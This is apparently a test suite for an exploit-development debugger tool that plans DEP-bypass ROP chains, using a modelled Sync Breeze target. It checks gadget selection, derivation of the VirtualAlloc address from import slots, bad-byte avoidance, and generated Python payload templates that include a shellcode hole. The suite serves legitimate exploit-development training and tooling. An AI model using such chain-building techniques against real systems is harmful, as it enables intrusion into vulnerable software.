import { describe, expect, test } from "vitest";
import { ReachIndex } from "../src/rop/reach";
import { spawnSync } from "node:child_process";
import { measureLanding } from "../src/commands/dep_build";
import { commands, crashOf, GADGETS, load, logs, syncBreeze, text, without, type Crash, type Module } from "./helpers/fixture_process";

// dep_plan from evidence alone: which modules can give gadgets, where the API's address comes from, which
// style the corpus supports, and whether a chain is needed at all. Each process here is built from real PE
// structures (headers, an import table, an export table) so the production lookups run unchanged.

const section = (output: string, header: string): string => {
  const start = output.indexOf(header);
  const rest = output.slice(start + header.length);
  const next = rest.search(/\n=== (\[\d\/7\]|STOP|Verdict)/);
  return output.slice(start, next < 0 ? undefined : start + header.length + next);
};

describe("dep_plan, reproduced Sync Breeze shape", () => {
  // Not observed: Sync Breeze is not installed on the lab clone. The shape is his run's: four modules
  // without ASLR, three of them at a base whose top byte is 00, the gadget module importing nothing the
  // chain calls but a neighbour from kernel32, no ESP capture, a pushad gadget, and DEP forced on by
  // Exploit Protection while the executable says NX_COMPAT disabled.
  const { BAD, FORCED, K32, kernel32, odbc32, shape } = syncBreeze;

  test("one call with only the bad chars reaches the route, the module and the style", () => {
    const api = load(shape(), { policy: 2, registry: FORCED });
    api.dep_plan(BAD);
    const output = text();
    // The echoed call names every choice this run made, so pasting it repeats the run.
    expect(output.split("\n").find((line) => line !== "")).toBe(`=== dx @$osed().dep_plan("VirtualAlloc", "libspp.dll", "${BAD}", "auto", 1) ===`);
    expect(output).toContain("=== DEP is on for syncbrs.exe ===");
    expect(output).toContain("Exploit Protection turns DEP on for syncbrs.exe (MitigationOptions in its Image File Execution Options key), whatever its NX_COMPAT flag says");
    expect(output).toContain("Gadgets come from every module that can give one: libspp.dll. Not usable: syncbrs.exe, every address holds the bad byte(s) 00; libpal.dll, every address holds the bad byte(s) 00; libsync.dll, every address holds the bad byte(s) 00; 1 with ASLR.");
    const slot = section(output, "=== [2/7]");
    expect(slot).toContain("No module with ASLR disabled imports VirtualAlloc itself, but libspp.dll imports kernel32!GetDriveTypeA, at slot 0x10113200.");
    expect(slot).toContain("VirtualAlloc = [0x10113200] - 0x000002FF, measured now with GetDriveTypeA at 0x75311800 and VirtualAlloc at 0x75311501");
    expect(slot).toContain("That distance holds for this build of kernel32 only. Any Windows update moves it");
    expect(slot).toContain("API_DELTA = 0xFFFFFD01");
    expect(output).toContain("=== [4/7] The gadget picked per job (pushad style: the skeleton style lacks capture ESP) ===");
    // The register loaders live in [5/7]: ESI gets the slot's pointer plus the distance. Which register
    // the distance is added in is the search's call, so what is asserted is the load, not one route: the
    // slot is read, API_DELTA goes on, and the value ends up in ESI.
    const loaders = section(output, "=== [5/7]");
    const esi = loaders.slice(loaders.indexOf("def load_virtualalloc"), loaders.indexOf("def load_return"));
    expect(esi).toContain("c.rop(MOV_EAX_MEM_EAX)");
    expect(esi).toContain("c.rop(POP_ECX, API_DELTA)");
    expect(esi).toMatch(/c\.rop\((MOV_ESI_EAX|ADD_ESI_ECX)\)/);
    expect(esi).not.toContain("hole(");
    expect(esi.slice(esi.lastIndexOf("c.rop"))).toMatch(/now \[IAT_SLOT\] \+ API_DELTA/);
    // Above the code, one line saying which gadgets were chosen for ESI and why that route. The heading
    // must say the list is the chain's own, because a reader who takes it for a reference stops trusting it.
    expect(loaders).toMatch(/What the chain does, one line per register, each searched through libspp\.dll/);
    expect(loaders).toMatch(/esi = VirtualAlloc \(\[IAT_SLOT\] \+ API_DELTA\): [A-Z_0-9 ->]*MOV_EAX_MEM_EAX[A-Z_0-9 ->]*\. \d gadgets: the value is the dword at IAT_SLOT, known only at run time/);
    expect(output).toContain("A VirtualAlloc chain from libspp.dll in the pushad style, the API reached from kernel32!GetDriveTypeA by a distance measured on this machine");
    expect(api.last_result().success).toBe(true);
  });

  // His run on Sync Breeze emitted `def load_virtualalloc(c):` with nothing in it but a hole, because the
  // only recipe was "build in EAX, then mov EAX into the target" and libspp has no mov into ESI. A
  // `push eax ; pop esi ; ret` was sitting in the same module: a move by another name.
  const NO_MOV_ESI = without(0x1111, 0x1181);
  const PUSH_POP_ESI: [number, number[]] = [0x1191, [0x50, 0x5e, 0xc3]];

  test("no mov into ESI, so the value goes through the stack instead of leaving the register a hole", () => {
    const api = load(shape({ code: [...NO_MOV_ESI, PUSH_POP_ESI] }), { policy: 2, registry: FORCED });
    api.dep_plan("VirtualAlloc", "libspp", BAD, "pushad");
    const output = text();
    const loaders = section(output, "=== [5/7]");
    const esi = loaders.slice(loaders.indexOf("def load_virtualalloc"), loaders.indexOf("def load_return"));
    expect(esi).not.toContain("hole(");
    expect(esi).not.toContain("no gadget moves eax into esi");
    expect(esi).toContain("c.rop(MOV_EAX_MEM_EAX)");
    expect(esi).toContain("c.rop(PUSH_EAX_POP_ESI)");
    expect(esi).toContain("c.rop(POP_ECX, API_DELTA)");
    // Every gadget the loader names is a real address from the scan, with its disassembly, in [4/7].
    const table = section(output, "=== [4/7]");
    expect(table).toContain("PUSH_EAX_POP_ESI = 0x10111191   # push eax ; pop esi ; ret");
    for (const name of esi.match(/c\.rop\(([A-Z_0-9]+)/g) ?? []) {
      expect(table, name).toContain(`${name.slice(6)} `);
    }
    expect(api.last_result().success).toBe(true);
  });

  test("nothing reaches ESI at all: the message names what was searched and the one gadget that would open it", () => {
    const api = load(shape({ code: NO_MOV_ESI }), { policy: 2, registry: FORCED });
    api.dep_plan("VirtualAlloc", "libspp", BAD, "pushad");
    const output = text();
    const loaders = section(output, "=== [5/7]");
    const esi = loaders.slice(loaders.indexOf("def load_virtualalloc"), loaders.indexOf("def load_return"));
    // Still a hole, because the module really cannot do it. What changes is that the hole says why.
    expect(esi).toContain("virtualalloc_value = hole(\"virtualalloc_value\")");
    expect(esi).toContain("esi = VirtualAlloc ([IAT_SLOT] + API_DELTA) cannot be reached.");
    expect(esi).toMatch(/searched: libspp\.dll gives \d+ distinct ways to write esi, with nothing to keep\. No combination of up to 8 of them reaches it\./);
    expect(esi).toContain("one gadget would unlock it: mov esi, dword [esi] ; ret");
    expect(esi).toContain("dx @$osed().palette(\"libspp.dll\", \"00 0A 0D 25 26 2B 3D\")");
    // And the same sentence, short, in the per-register route list and in the [7/7] payload.
    // Pinned whole, not by prefix: a prefix assertion would let the long form creep back in behind it.
    expect(loaders.split(/\r?\n/).map((line) => line.trim())).toContain(
      "[+]   esi = VirtualAlloc ([IAT_SLOT] + API_DELTA): no route among the 3 ways libspp.dll writes esi. "
      + "mov esi, dword [esi] ; ret would unlock it; load_virtualalloc below says what was searched.");
    expect(section(output, "=== [7/7]")).toContain("# esi = VirtualAlloc: no route, so load_virtualalloc below is a hole");
  });

  test("the pushad order is settled without searching the same register twice", () => {
    // The order is tried before any loader is written, and every loader then asks again. A search over a
    // real module costs tens of milliseconds on the debugger's engine, so asking twice is what turns a
    // pause into a wait. Measured at 1771 gadgets: 98 probes took 4816 ms unmemoised and 302 ms memoised.
    const reach = ReachIndex.prototype.reach;
    // One corpus per index: the message that names the unlocking gadget searches a corpus with that gadget
    // added, so those are different questions, not repeats. A repeat is the same question of one corpus.
    const corpora = new Map<ReachIndex, string[]>();
    ReachIndex.prototype.reach = function spy(this: ReachIndex, register, goal, options) {
      const asked = corpora.get(this) ?? [];
      asked.push(`${register}|${goal.mem?.at ?? ""}|${goal.k}|${goal.text}|${options.keep.slice().sort().join(",")}`);
      corpora.set(this, asked);
      return reach.call(this, register, goal, options);
    };
    try {
      const api = load(shape(), { policy: 2, registry: FORCED });
      api.dep_plan("VirtualAlloc", "libspp", BAD, "pushad");
      expect(api.last_result().success).toBe(true);
    } finally {
      ReachIndex.prototype.reach = reach;
    }
    const scanned = [...corpora.values()].sort((a, b) => b.length - a.length)[0];
    expect(scanned.length).toBeGreaterThan(6);
    expect(scanned.length, scanned.join(" | ")).toBe(new Set(scanned).size);
  });

  test("the distance is anchored only in a module without ASLR, and [2/7] ends on one pick", () => {
    // libsync.dll gives no gadget (its base holds 00) but has no ASLR, so its slot is a valid second anchor.
    const modules = shape();
    modules[2] = { ...modules[2], imports: [{ dll: "KERNEL32.dll", symbol: "TerminateProcess", target: K32 + 0x1900 }] };
    const api = load([...modules, odbc32], { policy: 2, registry: FORCED });
    api.dep_plan("VirtualAlloc", "libspp", BAD, "auto", 6);
    const slot = section(text(), "=== [2/7]");
    expect(slot).toContain("[+] No module with ASLR disabled imports VirtualAlloc itself, but libspp.dll imports kernel32!GetDriveTypeA, at slot 0x10113200.");
    expect(slot).toContain("[+] Chosen from 2 slots in modules without ASLR that reach VirtualAlloc by a distance: none is free of bad bytes, and this one is in libspp.dll, where the gadgets come from. The other one is in libsync.dll.");
    expect(slot).toContain("[+] ODBC32.dll imports VirtualAlloc itself, but has ASLR: its slot moves on every boot. No slot in a module with ASLR anchors the distance either.");
    expect(slot).toContain("[!] That distance holds for this build of kernel32 only.");
    // No slot of ODBC32.dll is offered, and no candidate table is printed.
    for (const offered of ["0x72893", "TerminateProcess", "derived-address", "Candidate for gadget feasibility", "rop.api_plan", "sc.iat_find"]) expect(slot).not.toContain(offered);
    expect(api.last_result().success).toBe(true);
  });

  test("a kernel32 export imported only by a module with ASLR is never offered as the anchor", () => {
    const api = load([...shape({ imports: [{ dll: "MSVCRT.dll", symbol: "memcpy", target: 0x10111121 }] }), odbc32], { policy: 2, registry: FORCED });
    api.dep_plan("VirtualAlloc", "libspp", BAD);
    const output = text();
    expect(output).toContain("[-] The API layer fails: no module with ASLR disabled imports VirtualAlloc (ODBC32.dll does, and it has ASLR), nor any other export of kernel32 or kernelbase to reach it from by a fixed distance. Its address needs a leak first.");
    expect(output).not.toContain("0x72893");
    expect(output).not.toContain("API_DELTA");
  });

  test("asked for the skeleton, it says the method is what fails and names the style that works", () => {
    const api = load(shape(), { policy: 2, registry: FORCED });
    api.dep_plan("VirtualAlloc", "libspp", BAD, "skeleton");
    const output = text();
    const picks = section(output, "=== [4/7]");
    expect(picks).toContain("  capture ESP: none in libspp.dll\n      absent from libspp.dll: every byte of libspp.dll searched for the 42 plain encodings of this job, no hit at all");
    expect(picks).toContain("capture ESP blocks the skeleton style, and the pushad style needs no such gadget: pushad pushes ESP itself.");
    expect(picks).toContain(`In libspp.dll the pushad style has a gadget for every job: dx @$osed().dep_candidates("libspp", "${BAD}", "pushad")`);
    expect(output).toContain(`No complete VirtualAlloc chain in the skeleton style: libspp.dll has no gadget for capture ESP, so [7/7] holds a hole for each. The pushad style has a gadget for every job: dx @$osed().dep_plan("VirtualAlloc", "libspp", "${BAD}", "pushad", 1)`);
    expect(api.last_result().success).toBe(false);
  });

  test("nothing fixed imports from kernel32: the API layer fails, in one line, with its reason", () => {
    const api = load(shape({ imports: [{ dll: "MSVCRT.dll", symbol: "memcpy", target: 0x10111121 }] }), { policy: 2, registry: FORCED });
    api.dep_plan(BAD);
    const output = text();
    const conclusion = "[-] The API layer fails: no module with ASLR disabled imports VirtualAlloc, VirtualProtect, WriteProcessMemory, nor any other export of kernel32 or kernelbase to reach it from by a fixed distance. Its address needs a leak first.";
    expect(output.split(conclusion).length - 1).toBe(2);
    expect(api.last_result().errors).toEqual([conclusion.slice(4)]);
  });

  test("no module can give a gadget: the module layer fails, and nothing is scanned", () => {
    const api = load(shape({ base: 0x00a10000 }), { policy: 2, registry: FORCED });
    api.dep_plan(BAD);
    const output = text();
    expect(output).toContain("[-] The module layer fails: no loaded module can give gadgets: syncbrs.exe (every address holds the bad byte(s) 00), libpal.dll (every address holds the bad byte(s) 00), libsync.dll (every address holds the bad byte(s) 00), libspp.dll (every address holds the bad byte(s) 00), and the rest have ASLR.");
    expect(output).not.toContain("rop.scan_live(");
  });
});

describe("dep_plan on a target with nothing at a fixed base", () => {
  test("the refusal names the leak as the missing piece and the command that starts it", () => {
    const api = load([
      { name: "tilecast.exe", base: 0x00b40000, aslr: true, nx: true, code: GADGETS },
      { name: "KERNEL32.DLL", base: 0x75310000, aslr: true, nx: true },
    ], { policy: 3 });
    api.dep_plan("00");
    const output = text();
    const stop = output.slice(output.lastIndexOf("=== STOP"));
    expect(stop).toContain("[-] The module layer fails: no loaded module can give gadgets: every one has ASLR.");
    expect(stop).toContain("[-] The missing piece is a leak: one pointer the target sends back, minus its RVA, is the base of a module with ASLR.");
    expect(stop).toContain("dx @$osed().leak.scan(@esp, 0x400)");
    expect(stop).toContain("dx @$osed().leak.base(<pointer>, <rva>)");
    expect(api.last_result().errors).toContain("Start at the crash: dx @$osed().leak.scan(@esp, 0x400) lists the pointers on the stack, each with its module and RVA.");
  });
});

describe("dep_plan asks first whether a chain is needed", () => {
  const vuln = (nx: boolean): Module[] => [
    { name: "vuln.exe", base: 0x00400000, nx },
    { name: "libbkup.dll", base: 0x11110000, code: GADGETS, imports: [{ dll: "KERNEL32.dll", symbol: "VirtualAlloc", target: 0x11111121 }] },
  ];
  const ABSENT = "ERROR: The system was unable to find the specified registry key or value.";

  test("DEP off: the stack runs the shellcode, so it hands over jmp esp and skips the chain, visibly", () => {
    const api = load(vuln(false), { policy: 2, registry: ABSENT });
    api.dep_plan("00 0A 0D");
    const output = text();
    expect(output).toContain("=== DEP is OFF for vuln.exe: no chain needed ===");
    expect(output).toContain("[-] The stack executes: the system policy is OptIn, vuln.exe does not opt in (NX_COMPAT disabled) and no Exploit Protection setting turns DEP on for it.");
    expect(output).toContain('[-] Jump straight to your shellcode: payload = b"A" * OFFSET + p32(0x11111291) + b"\\x90" * 16 + shellcode');
    const anyway = 'dx @$osed().dep_plan("VirtualAlloc", "libbkup.dll", "00 0A 0D", "auto", 1, "", true)';
    expect(output).toContain(`To build the chain anyway, as an exercise: ${anyway}`);
    expect(output).not.toContain("=== [1/7]");
    // The registry was read through the debugger, for the program by name.
    expect(commands.some((command) => command.startsWith('.shell -ci "x" reg query') && command.includes("Image File Execution Options\\vuln.exe"))).toBe(true);

    logs.length = 0;
    new Function("osed", `return osed.${anyway.slice("dx @$osed().".length)};`)((globalThis as unknown as { osed: unknown }).osed);
    const built = text();
    for (const n of [1, 2, 3, 4, 5, 6, 7]) expect(built).toContain(`=== [${n}/7]`);
    expect(api.last_result().success).toBe(true);
  });

  test.each([
    [true, 2, ABSENT, "=== DEP is on for vuln.exe ===", "The system policy is OptIn and vuln.exe opts in (NX_COMPAT enabled)"],
    [false, 3, ABSENT, "=== DEP is on for vuln.exe ===", "The system policy is OptOut"],
    [false, 2, "", "=== DEP for vuln.exe: unknown ===", "its Exploit Protection setting could not be read"],
  ])("NX_COMPAT %s, policy %i: the verdict and its reason", (nx, policy, registry, header, why) => {
    const api = load(vuln(nx), { policy, registry });
    api.dep_plan("VirtualAlloc", "libbkup", "00 0A 0D");
    const output = text();
    expect(output).toContain(header);
    expect(output).toContain(why);
    expect(output).toContain("=== [7/7]");
    expect(api.last_result().success).toBe(true);
  });
});

describe("dep_plan never reports an absence the scan did not settle", () => {
  const module = (code: Array<[number, number[]]>): Module[] => [
    { name: "libbkup.dll", base: 0x22220000, code, imports: [{ dll: "KERNEL32.dll", symbol: "VirtualAlloc", target: 0x22221121 }] },
  ];

  test("a gadget only at an address holding a bad byte is absent, and the count says why", () => {
    const api = load(module([...without(0x1111), [0x100a, [0x54, 0x5e, 0xc3]]]));
    api.dep_plan("VirtualAlloc", "libbkup", "00 0A 0D", "skeleton");
    expect(text()).toContain("      absent from libbkup.dll: every byte of libbkup.dll searched for the 42 plain encodings of this job, 1 hit(s), every one at an address holding a bad byte");
  });

  test("a gadget the scan never reached is found by searching the module, and used", () => {
    // 2048 copies of pop edx ; ret at addresses holding a bad byte: the pattern scan stops after 1500 of
    // them, and the one clean copy sits beyond. Before the search this job read "none in the corpus".
    const fill: number[] = [];
    for (let i = 0; i < 0x1000; i += 2) fill.push(0x5a, 0xc3);
    const bad = "00 0A 0D 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F";
    const api = load(module([...GADGETS, [0x1000, fill], [0x2051, [0x5a, 0xc3]]]));
    api.dep_plan("VirtualAlloc", "libbkup", bad, "pushad");
    const job = section(text(), "=== [4/7]");
    expect(job).toMatch(/pop edx[^\n]*:\n {2}> 0x22222051 {2}pop edx ; ret/);
    expect(job).toContain("      the scan had missed it: every byte of libbkup.dll searched for the 2 plain encodings of this job found it");
  });

  test("a complete scan he already ran is used, not thrown away and redone", () => {
    const api = load(module(GADGETS));
    api.rop.scan_live("libbkup", "00 0A 0D");
    logs.length = 0;
    api.dep_plan("VirtualAlloc", "libbkup", "00 0A 0D");
    const output = text();
    expect(output).toContain("[+] Using the corpus already loaded: a complete live scan of libbkup.dll for these bad chars");
    expect(output).not.toContain("rop.scan_live(");
    // Other bad chars are another corpus, so that one is scanned.
    logs.length = 0;
    api.dep_plan("VirtualAlloc", "libbkup", "00 0A 0D 20");
    expect(text()).toContain('dx @$osed().rop.scan_live("libbkup", "00 0A 0D 20")');
  });
});

describe("palette", () => {
  // dec eax ; ret sits only at 0x1111100A, which holds the bad byte 0A. The three after it were offered by
  // the first run on the clone and are wrong: one returns into its own push, one pivots, one reads [ecx+0x1c].
  const module: Module[] = [{ name: "libbkup.dll", base: 0x11110000, code: [...GADGETS, [0x100a, [0x48, 0xc3]],
    [0x1401, [0x43, 0x6a, 0x5d, 0xc3]], // inc ebx ; push 0x5d ; ret
    [0x1411, [0x4a, 0x89, 0xdc, 0xc3]], // dec edx ; mov esp, ebx ; ret
    [0x1421, [0x8b, 0x41, 0x1c, 0xc3]], // mov eax, [ecx+0x1c] ; ret
  ] }];
  const SEPARATOR = "# ------------------ copy into your exploit ------------------";
  const blockOf = (output: string): string[] => output.slice(output.indexOf(SEPARATOR) + SEPARATOR.length).trim().split("\n");
  // The line for one name, with the padding before its = collapsed.
  const entry = (block: string[], name: string): string | undefined => block.find((line) => line.startsWith(`${name} `))?.replace(/ += /, " = ");

  test("one line per shape, valid Python, each name once, None only where the module has none", () => {
    const api = load(module);
    api.palette("libbkup", "00 0A 0D");
    const output = text();
    const block = blockOf(output);
    const names: string[] = [];
    for (const line of block) {
      if (line === "" || line.startsWith("# ")) continue;
      const match = /^(GADGET_[A-Z0-9_]+) += (0x[0-9A-F]{8}|None)( +# .*)?$/.exec(line);
      expect(match, line).not.toBeNull();
      names.push(match![1]);
    }
    expect(new Set(names).size).toBe(names.length);
    expect(names.length).toBeGreaterThan(250);
    expect(entry(block, "GADGET_POP_EAX")).toBe("GADGET_POP_EAX = 0x11111271   # pop eax ; ret");
    expect(entry(block, "GADGET_NEG_EAX")).toBe("GADGET_NEG_EAX = 0x11111161   # neg eax ; pop ebp ; ret   costs (1, 0): 1 extra pop, writes ebp");
    expect(entry(block, "GADGET_MOV_ESP2ESI")).toBe("GADGET_MOV_ESP2ESI = 0x11111111   # push esp ; pop esi ; ret");
    expect(entry(block, "GADGET_XCHG_EAX2ESP")).toBe("GADGET_XCHG_EAX2ESP = 0x11111171   # xchg eax, esp ; ret");
    expect(entry(block, "GADGET_WRITE_EAX2EDI")).toMatch(/^GADGET_WRITE_EAX2EDI = 0x11111341   # mov .*\[edi\], eax ; ret$/);
    expect(entry(block, "GADGET_DEC_EAX")).toMatch(/^GADGET_DEC_EAX = None +# 1 only at an address holding a bad byte$/);
    expect(entry(block, "GADGET_DEC_ECX")).toBe("GADGET_DEC_ECX = None");
    expect(entry(block, "GADGET_INC_EBX")).toBe("GADGET_INC_EBX = None");
    expect(entry(block, "GADGET_DEC_EDX")).toBe("GADGET_DEC_EDX = None");
    expect(entry(block, "GADGET_READ_ECX2EAX")).toMatch(/^GADGET_READ_ECX2EAX = 0x11111421   # mov eax, .*\[ecx\+0x1c\] ; ret   costs \(0, 0\): reads \[ecx\+0x1c\], not \[ecx\]$/);
    expect(output).toMatch(/\n {2}NEG +1 of 7 +NEG_EAX\r?\n/);
  });

  test("a shape only the byte search finds is not None", () => {
    // pop edx ; ret at 0x22222051, beyond 2048 copies at addresses holding a bad byte: the scan stops first.
    const fill: number[] = [];
    for (let i = 0; i < 0x1000; i += 2) fill.push(0x5a, 0xc3);
    const bad = "00 0A 0D 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F";
    const api = load([{ name: "libbkup.dll", base: 0x22220000, code: [[0x1000, fill], [0x2051, [0x5a, 0xc3]]] }]);
    api.palette("libbkup", bad);
    expect(entry(blockOf(text()), "GADGET_POP_EDX")).toBe("GADGET_POP_EDX = 0x22222051   # pop edx ; ret");
  });
});


// What the target receives, not what the blocks say: the pasted file's payload function is called with the
// shellcode hole filled, and the bytes it returns are read. The skeleton pivot once sent neg(-20), which is
// 0x00000014, three null bytes the string copy stopped at.
describe("dep_plan builds what it sends", () => {
  const PYTHON = process.env.PYTHON ?? "python";
  const HAS_PYTHON = spawnSync(PYTHON, ["--version"]).status === 0;
  const BAD = [0x00, 0x0a, 0x0d];
  // mov eax, edi ; ret, so the skeleton's pivot can take the field address. No pop takes 0x14 cleanly.
  const MOV_EAX_EDI: [number, number[]] = [0x1391, [0x89, 0xf8, 0xc3]];
  // xchg eax, ebx, edx and ecx, so the pushad constants built in eax reach their registers.
  // sub eax, ecx ; ret too, since the distance to the sled is only clean subtracted.
  const XCHG: Array<[number, number[]]> = [[0x13a1, [0x93, 0xc3]], [0x13b1, [0x92, 0xc3]], [0x13c1, [0x91, 0xc3]], [0x13d1, [0x29, 0xc8, 0xc3]]];
  const vuln = (code: Array<[number, number[]]>): Module[] => [
    { name: "vuln.exe", base: 0x00400000, nx: true },
    { name: "libbkup.dll", base: 0x11110000, code, imports: [{ dll: "KERNEL32.dll", symbol: "VirtualAlloc", target: 0x11111121 }] },
  ];
  const blocks = (output: string): string[][] => output.split("# ------------------ copy into your exploit ------------------\n").slice(1)
    .map((part) => part.split("\n=== ")[0].split("\n").filter((line) => !line.startsWith("[")));
  const send = (output: string, offset: number): { sent: Buffer; error: string } => {
    const file = [`OFFSET = ${offset}`, 'BADCHARS = b"\\x00\\x0a\\x0d"', ...blocks(output).flat(), "import sys",
      "sys.stdout.write(payload1().hex())"].join("\n").replace('shellcode = hole("shellcode")', 'shellcode = b"\\xcc" * 8');
    const run = spawnSync(PYTHON, ["-I", "-"], { input: file, encoding: "utf-8", timeout: 4000 });
    return { sent: Buffer.from(run.stdout.trim(), "hex"), error: run.stderr.trim() };
  };
  const plan = (style: string, code: Array<[number, number[]]> = [...GADGETS, MOV_EAX_EDI, ...XCHG], crash?: Crash): string => {
    load(vuln(code), { policy: 2, registry: "", crash });
    (globalThis as unknown as { osed: { dep_plan: (...args: unknown[]) => unknown } }).osed.dep_plan("VirtualAlloc", "libbkup", "00 0A 0D", style);
    return text();
  };

  test.skipIf(!HAS_PYTHON).each(["skeleton", "pushad"])("the %s payload carries no bad byte", (style) => {
    const output = plan(style);
    expect(output, style).toContain("1 hole(s) to fill, each a hole(...) line with the reason in the comment above it:\n[+]   shellcode: msfvenom");
    const { sent, error } = send(output, 516);
    expect(error, style).toBe("");
    expect(sent.length).toBeGreaterThan(516);
    for (const bad of BAD) expect(sent.indexOf(bad), `${style}: 0x${bad.toString(16)} at ${sent.indexOf(bad)}`).toBe(-1);
  });

  test("the skeleton pivot's distance is built when the pop would send a bad byte", () => {
    const pivot = section(plan("skeleton"), "=== [7/7]");
    expect(pivot).not.toMatch(/c\.rop\(POP_ECX, 0x00000014\)|neg\(-20\)/);
    expect(pivot).toMatch(/# eax -= 0x00000014 for the pivot: ecx = 0xFFFFFFEC, then add/);
  });

  test("a distance no route can build becomes a hole that names it, never a dword sent", () => {
    // No add or sub into any register, so no pivot distance can be built at all.
    const output = plan("skeleton", [...without(0x1361, 0x1151), MOV_EAX_EDI]);
    expect(section(output, "=== [7/7]")).toContain("pivot_value: no add or sub of a register into eax whose distance the search can load");
  });

  test.skipIf(!HAS_PYTHON)("a ret 4 is read off the crash, written into [6/7], and the payload puts the chain where ESP lands", () => {
    const output = plan("pushad", undefined, crashOf(516, 4));
    const frame = section(output, "=== [6/7]");
    expect(frame).toContain("ESP after the crashing ret: EIP 0x42424242 sits at ESP-8, so the ret moved ESP 4 bytes past it (dds esp-8 L2).");
    expect(frame).toContain("The chain's second dword sits at OFFSET + 8: RET_GAP puts 4 junk bytes after the first gadget.");
    expect(frame).toContain("RET_GAP = 4");
    const { sent, error } = send(output, 516);
    expect(error).toBe("");
    // The first gadget fills EIP, four junk bytes follow, and the second gadget sits where ESP points.
    const plain = send(plan("pushad", undefined, crashOf(516, 0)), 516).sent;
    expect(sent.subarray(516, 520)).toEqual(plain.subarray(516, 520));
    expect(sent.subarray(520, 524)).toEqual(Buffer.from("AAAA"));
    expect(sent.subarray(524, 528)).toEqual(plain.subarray(520, 524));
  });

  test("the gap is the distance from the EIP dword to ESP, and an input that cannot show it says so", () => {
    const stack = (crash: Crash) => (address: number): number | undefined => {
      const at = address - crash.stack.base;
      return at >= 0 && at + 4 <= crash.stack.bytes.length ? new DataView(crash.stack.bytes.buffer).getUint32(at, true) : undefined;
    };
    for (const gap of [0, 4, 8, 0x10]) {
      const crash = crashOf(516, gap);
      expect(measureLanding(crash.eip, crash.esp, stack(crash))).toMatchObject({ gap, measured: true });
    }
    const flat = crashOf(516, 0);
    flat.stack.bytes.fill(0x41);
    expect(measureLanding(0x41414141, flat.esp, stack(flat))).toMatchObject({ gap: 0, measured: false });
    expect(measureLanding(undefined, undefined, () => undefined).how).toContain("not measured, no registers to read");
  });

  // wbcore.dll's shape: the captured ESP's only add is `add esi, esi`, and the value register has no sub.
  const ADD_ESI_ESI: [number, number[]] = [0x13f1, [0x01, 0xf6, 0xc3]];
  const ADD_EDI_ECX: [number, number[]] = [0x1401, [0x01, 0xcf, 0xc3]];
  const SUB_EDX_ECX: [number, number[]] = [0x1411, [0x29, 0xca, 0xc3]];
  const MOV_EDX_EDI: [number, number[]] = [0x1421, [0x89, 0xfa, 0xc3]];
  const MOV_EAX_EDX: [number, number[]] = [0x1431, [0x89, 0xd0, 0xc3]];

  test.skipIf(!HAS_PYTHON)("a register added to itself is no distance: it goes onto the copy, and the sled distance is worked out elsewhere", () => {
    const output = plan("skeleton", [...without(0x1151, 0x1361), ADD_ESI_ESI, ADD_EDI_ECX, MOV_EAX_EDI, SUB_EDX_ECX, MOV_EDX_EDI, MOV_EAX_EDX, ...XCHG.slice(0, 3)]);
    const jobs = section(output, "=== [4/7]");
    expect(jobs).toContain("no: adds esi to itself, which doubles it and adds no distance");
    const chain = section(output, "=== [7/7]");
    expect(chain).toMatch(/c\.rop\(MOV_EDI_ESI\)\n {4}# edi -= 0x0000001C for field 1: ecx = 0xFFFFFFE4, then add\n {4}c\.rop\(POP_ECX, 0xFFFFFFE4\)/);
    expect(section(output, "=== [5/7]")).toMatch(/def load_return\(c, field\):[^\n]*\n {4}c\.rop\(MOV_EDX_EDI\)\n[^\n]*\n {4}c\.rop\(POP_ECX, 0\)\n {4}c\.rop\(SUB_EDX_ECX\)\n {4}c\.rop\(MOV_EAX_EDX\)/);
    expect(output).toContain("1 hole(s) to fill");
    const { sent, error } = send(output, 516);
    expect(error).toBe("");
    for (const bad of BAD) expect(sent.indexOf(bad), `0x${bad.toString(16)}`).toBe(-1);
  });
});

// The method layer once matched each job to one named gadget, so a module whose only copy was
// `push esi ; pop edi ; ret` was refused, and VirtualProtect was refused for lacking a negate only
// VirtualAlloc's frame uses. A job is now met by any sequence that does it, and only the API's own jobs count.
describe("dep_plan asks of the method only what the API needs, done by any sequence", () => {
  const vuln = (code: Array<[number, number[]]>, api = "VirtualAlloc"): Module[] => [
    { name: "vuln.exe", base: 0x00400000, nx: true },
    { name: "libbkup.dll", base: 0x11110000, code, imports: [{ dll: "KERNEL32.dll", symbol: api, target: 0x11111121 }] },
  ];
  const MOV_EAX_EDI: [number, number[]] = [0x1391, [0x89, 0xf8, 0xc3]];
  const SUB_EAX_ECX: [number, number[]] = [0x13d1, [0x29, 0xc8, 0xc3]];
  const PUSH_ESI_POP_EDI: [number, number[]] = [0x13e1, [0x56, 0x5f, 0xc3]];
  const XCHG_EAX_ECX: [number, number[]] = [0x13c1, [0x91, 0xc3]];
  const run = (code: Array<[number, number[]]>, api: string, style: string): string => {
    const osed = load(vuln(code, api), { policy: 2, registry: "" });
    osed.dep_plan(api, "libbkup", "00 0A 0D", style);
    return text();
  };

  test("a copy done by a push and a pop meets the copy job, and the chain uses it", () => {
    const output = run([...without(0x1331), MOV_EAX_EDI, SUB_EAX_ECX, PUSH_ESI_POP_EDI], "VirtualAlloc", "skeleton");
    expect(section(output, "=== [4/7]")).toContain("    no single gadget does it, a sequence does: esi into edi by push esi ; pop edi ; ret");
    expect(output).not.toContain("The method layer fails");
    const chain = section(output, "=== [7/7]");
    expect(chain).toContain("1 hole(s) to fill");
    expect(chain).toMatch(/c\.rop\(ADD_ESI_ECX\)\n {4}c\.rop\(PUSH_ESI_POP_EDI\)/);
  });

  test("with no negate, VirtualProtect's skeleton is complete while VirtualAlloc's lacks it", () => {
    const code = [...without(0x1161), MOV_EAX_EDI, SUB_EAX_ECX];
    const vp = run(code, "VirtualProtect", "skeleton");
    expect(section(vp, "=== [4/7]")).not.toContain("  negate");
    expect(vp).not.toContain("No gadget in libbkup.dll for");
    const va = run(code, "VirtualAlloc", "skeleton");
    expect(va).toContain("No gadget in libbkup.dll for: negate.");
  });

  test("with no pop eax, a pop ecx and an xchg load EAX, and the pushad style is not refused for it", () => {
    const output = run([...without(0x1271), XCHG_EAX_ECX], "VirtualProtect", "pushad");
    expect(section(output, "=== [4/7]")).toMatch(/pop eax: no single gadget does it, a sequence does: the chain into eax by pop ecx ; ret, then xchg (eax, ecx|ecx, eax) ; ret/);
    expect(output).not.toMatch(/No gadget in libbkup.dll for: [^\n]*pop eax/);
  });
});
